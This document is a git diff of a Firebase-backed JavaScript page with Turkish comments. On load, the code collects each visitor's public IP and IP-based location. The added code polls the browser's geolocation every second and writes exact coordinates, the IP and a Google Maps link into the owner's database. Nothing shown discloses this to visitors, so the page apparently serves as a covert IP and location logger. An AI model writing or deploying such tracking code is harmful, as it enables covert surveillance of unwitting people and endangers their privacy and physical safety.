@@ -12,36 +12,37 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 let db = firebase.database();
 
+//id üret
+let idKey = db.ref().child("/").push().key;
+
 const getPlain = async () => {
   return await $.get("https://ipecho.net/plain");
-};
-
-const request = async (data) => {
-  return await $.get("https://ipapi.co/" + data + "/json/");
 };
 
 const ajaxFunc = async (_data) => {
   await $.ajax({
     type: "GET",
-    url: "https://ipapi.co/" + _data + "/json/",
+    url: "https://geo.risk3sixty.com/" + _data,
     dataType: "json",
-  }).done((getData) => {
-    const getAll = {
-      ip: getData.ip,
-      city: getData.city,
-      latitude: getData.latitude,
-      longitude: getData.longitude,
-      mapsUrl:
-        "https://www.google.com/maps/place/" +
-        getData.latitude +
-        "," +
-        getData.longitude,
-    };
+  })
+    .done((getData) => {
+      const getAll = {
+        ip: getData.ip,
+        city: getData.city,
+        latitude: getData.ll[0],
+        longitude: getData.ll[1],
+        mapsUrl:
+          "https://www.google.com/maps/place/" +
+          getData.ll[0] +
+          "," +
+          getData.ll[1],
+      };
 
-    Object.assign(getAll, todayDate());
-    const ID = createID();
-    insert("GetInfo",ID,getAll);
-  });
+      Object.assign(getAll, todayDate());
+      
+      insert("GetInfo", idKey, getAll);
+    })
+    .catch();
 };
 
 getPlain().then((data) => {
@@ -57,12 +58,6 @@ const deleteAll = (columnName) => {
   });
 };
 
-//Id üret
-const createID = () => {
-  let idKey = db.ref().child("/").push().key;
-  return idKey;
-};
-
 //Added !
 const insert = (columnName, id, data) => {
   db.ref(columnName + "/" + id).set(data);
@@ -74,20 +69,57 @@ const todayDate = () => {
   return { dataIsGetDate: date.toLocaleString("tr") };
 };
 
-$("#btnLogin").click(function (e) {
-  //Data Find
-  let controlFind = false;
-  const Find = (async (columnName, id) => {
-    db.ref(columnName + "/" + id).on("value", (data) => {
-      if (data.val() === null) {
-        controlFind = false;
-      } else {
-        if (data.val() === $("#pass").val()) {
-          controlFind = true;
-          sessionStorage.setItem($("#kad").val(), $("#pass").val());
-          window.location.pathname = "admin.html";
-        }
-      }
-    });
-  })("GetInfo", $("#kad").val());
-});
+function getuserLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      showuserPosition,
+      showbrowserError
+    );
+  } else {
+    console.log("Tarayıcı Desteklemiyor");
+  }
+}
+
+const locationInterval = setInterval(() => {
+  getuserLocation();
+}, 1000);
+
+function showuserPosition(position) {
+  const latlon = position.coords.latitude + "," + position.coords.longitude;
+  let mapsObj;
+
+  getPlain().then((e) => {
+    mapsObj = {
+      x: position.coords.latitude,
+      y: position.coords.longitude,
+      ip: e,
+      url:
+        "https://www.google.com/maps/place/" +
+        position.coords.latitude +
+        "," +
+        position.coords.longitude,
+
+      date: todayDate().dataIsGetDate,
+    };
+    insert("Maps/", idKey, mapsObj);
+  });
+
+  clearInterval(locationInterval);
+}
+
+function showbrowserError(error) {
+  switch (error.code) {
+    case error.PERMISSION_DENIED:
+      console.log("KULLANICI GEOLOCATION TALEBINI REDDETTI");
+      break;
+    case error.POSITION_UNAVAILABLE:
+      console.log("KONUM BILGISI YOK");
+      break;
+    case error.TIMEOUT:
+      console.log("ZAMAN ASIMI");
+      break;
+    case error.UNKNOWN_ERROR:
+      console.log("BILINMEYEN HATA");
+      break;
+  }
+}
